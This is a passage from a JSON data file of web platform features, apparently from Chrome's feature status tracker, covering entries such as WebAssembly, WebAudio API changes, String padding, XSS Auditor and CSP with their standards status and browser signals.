    "summary": "As HTML spec extended MessageEvent to allow ServiceWorker as a type of the source attribute, client.postMessage(message, transfer) and creation of custom message events are changed to use MessageEvent instead of ServiceWorkerMessageEvent. ServiceWorkerMessageEvent is removed.",
    "id": 5014379292524544,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:27.399240",
      "by": "ericbidelman@google.com"
    },
    "name": "SVGCursorElement",
    "tags": [
      "SVG"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://svgwg.org/svg2-draft/interact.html#CursorElement",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 57
        },
        "owners": [
          "fs@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "blink_components": [
          "Blink>SVG"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=650598",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The <cursor> element. Can be referenced from the 'cursor' property to provide a use-defined cursor image.",
    "id": 4562605574193152,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/SVGCursorElement"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:30.923470",
      "by": "ericbidelman@google.com"
    },
    "name": "Shape Detection API",
    "tags": [
      "face detection",
      "qr detection",
      "barcode detection"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://wicg.github.io/shape-detection-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://discourse.wicg.io/t/rfc-proposal-for-face-detection-api/1642/3",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 57
        },
        "owners": [
          "mcasas@chromium.org",
          "xianglu@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "ios": 57,
        "blink_components": [
          "Blink>Image"
        ],
        "desktop": 57,
        "flag": true,
        "android": 57,
        "bug": "https://crbug.com/646035",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Photos and images constitute the largest chunk of the Web, and many include recognisable features, such as human faces or QR codes. Detecting these features is computationally expensive, but, particularly on mobile devices, hardware manufacturers have long been supporting these features. This API allows accessing hardware-accelerated detectors where available. This is expected to be in origin trials in Chrome 58.",
    "id": 4757990523535360,
    "resources": {
      "docs": [
        "https://wicg.github.io/shape-detection-api/"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-02-09 15:01:12.404220",
      "by": "mathiasb@google.com"
    },
    "name": "String.prototype.padStart() / String.prototype.padEnd()",
    "tags": [
      "String",
      "JavaScript",
      "JS",
      "ECMAScript",
      "padStart",
      "padEnd",
      "String.prototype",
      "String.prototype.padStart",
      "String.prototype.padEnd"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://tc39.github.io/ecma262/#sec-string.prototype.padstart",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "caitp@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=4954",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "String formatting tools which returns a target/receiver string prepended or appended with a repeating pattern of characters:\r\n\r\n\"foo\".padStart(10, \"0\"); -> \"0000000foo\";\r\n\"foo\".padEnd(10, \"0\");  ->  \"foo0000000\";\r\n",
    "id": 5694172086403072,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/padStart",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/padEnd",
        "http://www.2ality.com/2015/11/string-padding.html"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-03-26 00:56:19.197430",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAssembly",
    "tags": [
      "WebAssembly",
      "wasm",
      "web assembly"
    ],
    "comments": "WebAssembly's initial version has implementations in all major engines. Its W3C community group includes contributors from Mozilla, Google, Microsoft, and Apple. A W3C working group is in the process of forming.\r\n\r\nFollow design discussions at: https://github.com/WebAssembly/design\r\nWebAssembly W3C community group: https://www.w3.org/community/webassembly/",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://webassembly.github.io/spec/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1232205",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "titzer@chromium.org",
          "bradnelson@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>WebAssembly"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=575167",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/pull/63",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/?#specification-webassembly",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "WebAssembly, or wasm, is an efficient low-level programming language for in-browser client-side execution. It is designed to support C/C++ and similar low-level languages. Future versions may be enhanced to better support other languages. WebAssembly is intended to be small, fast to decode, fast to compile, and fast to execute.\r\n",
    "id": 5453022515691520,
    "resources": {
      "docs": [
        "https://github.com/WebAssembly/design",
        "https://github.com/WebAssembly/spec",
        "https://developer.mozilla.org/en-US/docs/WebAssembly"
      ],
      "samples": [
        "http://webassembly.org/demo/"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:02.081020",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: Add AudioContext.getOutputTimestamp() method ",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "mikhail.pozdnyakov@intel.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "ios": 57,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=619533",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The AudioContext.getOutputTimestamp() method helps to synchronize DOM time and AudioContext time values. It is used to estimate DOMHighResTimeStamp value of the audio output stream position for the given AudioContext.currentTime value, or do the opposite: estimate  AudioContext.currentTime value of the audio output stream position for the given DOMHighResTimeStamp value.",
    "id": 5743255039770624,
    "resources": {
      "docs": [
        "https://webaudio.github.io/web-audio-api/#widl-AudioContext-getOutputTimestamp-AudioTimestamp",
        "https://developer.mozilla.org/en-US/docs/Web/API/AudioContext"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:46.142530",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: Add AudioScheduledSourceNode base class for source nodes",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "ios": 57,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "http://crbug.com/661207",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add AudioScheduledSourceNode as a base class of AudioBufferSourceNode, OscillatorNode, and ConstantSourceNode.\r\n\r\nThis is a small change to capture the common features of the source nodes into a base class.",
    "id": 5644431130624000,
    "resources": {
      "docs": [
        "https://webaudio.github.io/web-audio-api/#AudioScheduledSourceNode"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:36.130450",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: AudioParam cancelAndHoldAtTime",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "ios": 57,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "http://crbug.com/432934",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "cancelAndHoldAtTime cancels future AudioParam events and holds the value of the AudioParam at the value at the scheduled time.",
    "id": 5116894524735488,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/AudioParam/cancelAndHoldAtTime",
        "https://webaudio.github.io/web-audio-api/#widl-AudioParam-cancelAndHoldAtTime-AudioParam-double-cancelTime"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:50.650120",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: Event Constructors",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "ios": 57,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "http://crbug.com/662164",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 57
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allow WebAudio-specific events to be constructed. Specifically, OfflineAudioCompletionEvent and AudioProcessEvent can be constructed.",
    "id": 5670531110010880,
    "resources": {
      "docs": [
        "https://webaudio.github.io/web-audio-api/#OfflineAudioCompletionEvent",
        "https://webaudio.github.io/web-audio-api/#the-audioprocessingevent-interface---deprecated"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:27.567920",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: Remove prefixed AudioContext and OfflineAudioContext",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "ios": 57,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://crbug.com/665887",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Support for webkitAudioContext and webkitOfflineAudioContext is removed in favor of AudioContext and OfflineAudioContext.  Currently warnings are produced, but upon removal, the prefixed versions will no longer exist.",
    "id": 4571020824412160,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:02.917150",
      "by": "ericbidelman@google.com"
    },
    "name": "XSS Auditor blocks by default",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "tsepez@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://crbug.com/654794",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Chrome's XSS Auditor should block pages by default, rather than filtering out suspected reflected XSS. Moreover, we should remove the filtering option, as breaking specific pieces of page's script has been an XSS vector itself in the past.",
    "id": 5748927282282496,
    "resources": {
      "docs": [
        "https://msdn.microsoft.com/en-us/library/dd565647(v=vs.85).aspx"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:40.373460",
      "by": "ericbidelman@google.com"
    },
    "name": "basic-card support in PaymentRequest",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webpayments-methods-card/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "rouslan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "flag": false,
        "android": 57,
        "bug": "http://crbug.com/665190",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Support the \"basic-card\" method for web payments.",
    "id": 5408502604365824,
    "resources": {
      "samples": [
        "https://rsolomakhin.github.io/pr/"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:57.362270",
      "by": "ericbidelman@google.com"
    },
    "name": "fieldset.elements returns an HTMLCollection, not an HTMLFormControlsCollection",
    "tags": [
      "HTML",
      "Forms",
      "Fieldset"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/forms.html#dom-fieldset-elements",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "blink_components": [
          "Blink>Forms>Fieldset"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "http://crbug.com/665291",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "url": "https://github.com/whatwg/html/issues/200#issuecomment-148880638",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The specification was changed so that fieldset.elements returns an HTMLCollection instead of an HTMLFormControlsCollection.\r\n\r\nhttps://github.com/whatwg/html/commit/934887d313305448b7ba6dd3af6f7434e1b600c8",
    "id": 5712451869868032,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:59.401150",
      "by": "ericbidelman@google.com"
    },
    "name": "location.reload() behavior change",
    "comments": "https://groups.google.com/a/chromium.org/forum/#!topic/loading-dev/gD-MPRcfwVA/discussion\r\n\r\nThe feature is enabled via server side configuration on Chrome m57. Without server managed configuration, chromium-based applications need to wait for m59 that enables the feature by default in the source code. E.g., probably Opera Starts supporting this at 46, and WebView does at m59.",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "toyoshim@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 59,
        "blink_components": [
          "Blink>Loader"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://crbug.com/670237",
        "intervention": false
      },
      "opera": {
        "android": 46,
        "desktop": 46
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Originally, location.reload() revalidates all cached resources.\r\nBut from the m57, this behavior is changed to revalidate only the main resource, and to follow cache policy protocols for subresources.",
    "id": 5724282256621568,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:55.817060",
      "by": "ericbidelman@google.com"
    },
    "name": "ongot/lostpointercaptures in GlobalEventHandlers",
    "comments": "ongotpointercapture, onlostpointercapture, GlobalEventHandlers, Pointerevent",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/pointerevents/#extensions-to-the-globaleventhandlers-interface",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "nzolghadr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=674290",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "url": "https://github.com/w3c/pointerevents/issues/157",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Previously in PointerEvents spec v1 (https://www.w3.org/TR/pointerevents/) we had ongotpointercapture and onlostpointercapture attributes as part of the Element. Now we are moving them to GlobalEventHandlers to make them consistent with the other on'event' attributes as the capture events will also bubble similar to other events.\r\nNote that this way of listening to the events through on'event' attributes are legacy and should not be mostly used. But this change makes sure they are all consistent.",
    "id": 5702802084986880,
    "resources": {}
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2018-01-30 20:03:50.676660",
      "by": "jsbell@chromium.org"
    },
    "name": "webkit-prefixed IndexedDB global aliases",
    "tags": [
      "IndexedDB"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/IndexedDB",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 57
        },
        "owners": [
          "jsbell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "blink_components": [
          "Blink>Storage>IndexedDB"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://crbug.com/665243",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The IndexedDB entry point and global constructors were exposed with `webkit` prefixes as was common circa Chrome 11:\r\n\r\nwebkitIndexedDB (main entry point)\r\nwebkitIDBKeyRange (non-callable global constructor, but has useful static methods)\r\nwebkitIDBCursor webkitIDBDatabase webkitIDBFactory webkitIDBIndex  webkitIDBObjectStore webkitIDBRequest webkitIDBTransaction (non-callable global constructors)\r\n\r\nThe non-prefixed API shipped in M24 and the prefixed versions deprecated in M38.",
    "id": 5775330191081472,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-26 03:59:04.096650",
      "by": "kojii@chromium.org"
    },
    "first_of_milestone": true,
    "name": "\"system-ui\" generic font family",
    "comments": "Safari and Firefox shipped the old name, \"-apple-system\" on Mac, and has a bug to rename and support other platforms, but that has not been done yet.\r\n\r\nBlink has shipped non-standard name, \"BlinkMacSystemFont\" again only on Mac.\r\n\r\nThis feature supports the standardized name on all platforms, includes aliasing old name on Mac and measure the usage for deprecation.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-fonts-4/#valdef-font-family-system-ui",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1226042",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "kojii@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink>Fonts"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/654679",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=151493",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This generic font family allows authors to style contents so it fits within the system UI.",
    "id": 5640395337760768,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:35.866850",
      "by": "ericbidelman@google.com"
    },
    "name": "2nd arg of document.createElement should be an object",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org/#dom-document-createelement",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "dominicc@chromium.org",
          "a.obzhirov@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=637353",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This feature adds a dictionary as a second argument for document.createElement. The dictionary 'is' member is used to set custom element attribute. \r\n\r\nFor now both syntaxes will be supported.\r\n\r\nLater on after v1 custom elements (https://www.chromestatus.com/features/4696261944934400) are shipped the string argument will be deprecated.\r\n",
    "id": 5094346349084672,
    "resources": {
      "docs": [
        "https://dom.spec.whatwg.org/#dom-document-createelement",
        ""
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:52.330630",
      "by": "ericbidelman@google.com"
    },
    "name": "CSP 'referrer' directive",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/webappsec-referrer-policy/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 56
        },
        "owners": [
          "estark@chromium.org",
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=658761",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The CSP 'referrer' directive allows site owners to set a Referrer Policy (https://w3c.github.io/webappsec-referrer-policy/) for their page from an HTTP header. The 'referrer' directive has been removed from the spec and replaced with the Referrer-Policy header.\r\n\r\nThis feature was added in Chrome 33.",
